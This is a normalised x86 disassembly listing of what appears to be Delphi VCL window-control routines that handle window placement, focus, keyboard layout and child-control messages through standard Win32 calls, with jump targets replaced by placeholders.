mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_43c94c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403490
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403490
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43c98c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_438978
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43c9e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41ae4c
mov edx [ r-xdata ]
call sub_403444
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_43ca1c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_414170
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ca40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43df6c
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_43ca9c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43ca08
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_414170
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_43cadc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4056a4
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4056a4
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_43cb48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43cbf0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cbf7
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_435458
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403294
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_40568c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403490
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4056a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ edi + 0x178 ] eax
sub_43cc00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43a804
xor edx edx
push ebp
push sub_43ccc2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403490
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ccc9
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43ccc9
mov eax [ ebp - 0x4 ]
call sub_44e0a8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_437a0c
sub_43cd14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031dc
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439638
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43cd7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_437a0c
sub_43cd98
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43cdc0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44e0a8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44dfb0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403490
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43cdc0
test al al
jne r-xdata
sub_43ce28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cdc0
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43f074
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ce54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cdc0
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43f074
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ce80
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43cea8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44e0a8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44dfb0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403490
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43cea8
test al al
jne r-xdata
sub_43cf10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cf30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cf70
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44e0a8
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403490
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43cf70
test al al
jne r-xdata
sub_43cfd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cf70
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_438978
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43cff4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43d0a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43cff4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44e0a8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_438978
test eax eax
jne r-xdata
sub_43d14c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d16c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43bbec
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d1a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d1c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43d210
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43d234
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_436a78
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43ac9c
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43ac60
mov dl [ esp ]
mov si 0xffd1
call sub_403490
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43d28c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403490
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43d2b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403490
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43d2e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43944c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_43acfc
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_43b50c
sub_43d320
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403490
pop esi
pop ebx
retn
mov eax ebx
call sub_437e08
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404510
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404510
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43d3a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b8ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_439520
sub_43d400
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43b660
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43aa5c
pop ebx
retn
sub_43d430
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43d458
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43aa5c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_43d4c8
push ebx
mov ebx eax
mov eax ebx
call sub_43938c
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_43acfc
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41d9cc
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_438978
sub_43d504
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_436058
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43df6c
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_438978
sub_43d544
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43e270
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43df6c
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d584
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_43acfc
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43de74
sub_43d5c4
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43e0ac
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43e0ac
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_43d624
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4383d4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4372f0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43b858
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_43d694
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4394c4
mov edx esi
mov eax ebx
call sub_43acbc
pop esi
pop ebx
retn
sub_43d6b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_4346e8
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44e0a8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403490
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403490
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403490
test al al
jne r-xdata
sub_43d744
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43f074
mov edx esi
mov eax ebx
call sub_43d6b0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_438978
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_438978
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_438978
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0a8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_438978
test eax eax
jne r-xdata
jmp r-xdata
sub_43d828
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_438978
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_43d87c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_438978
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0a8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_438978
test eax eax
jne r-xdata
sub_43d8c8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_43d6b0
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_438978
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0a8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_438978
test eax eax
jne r-xdata
sub_43d924
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0a8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_438978
mov [ esi + 0xc ] eax
sub_43d958
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_436e00
mov eax ebx
mov si 0xffd0
call sub_403490
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43714c
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43da30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43ac9c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43ac60
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403490
inc edi
dec ebx
jne r-xdata
sub_43da78
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a804
xor eax eax
push ebp
push sub_43db16
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da30
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4373c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43db1d
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
